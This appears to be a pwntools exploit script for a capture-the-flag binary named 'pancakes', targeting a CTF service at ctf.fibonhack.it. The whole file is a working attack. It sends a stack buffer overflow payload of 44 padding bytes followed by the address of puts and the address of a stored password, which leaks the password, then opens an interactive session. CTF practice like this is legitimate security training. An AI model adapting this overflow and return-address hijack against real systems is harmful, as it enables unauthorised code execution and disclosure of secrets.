from pwn import *
#import pdb
exe = context.binary = ELF('pancakes')
remotehost = ('ctf.fibonhack.it', 16001)

gdbscript ='''
b *pwnme
'''.format(**locals())

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            exe=exe.path, args=[exe.path] + argv,
            gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        
context.log_level = 'debug'
io = start()
ui.pause()
io.recvline()

##### Generation of unique sequences ####
g = cyclic_gen()
readpassword = 0x080491d2

puts = 0x08049060

password_addr = 0x0804c060



#main_offset = 0x1319
     #  [padding] + [puts()] + [password_address] 
buff = b'A'*44 + p32(puts) + b'\x00'*4 + p32(password_addr) 

io.sendline(buff) 

	

io.interactive()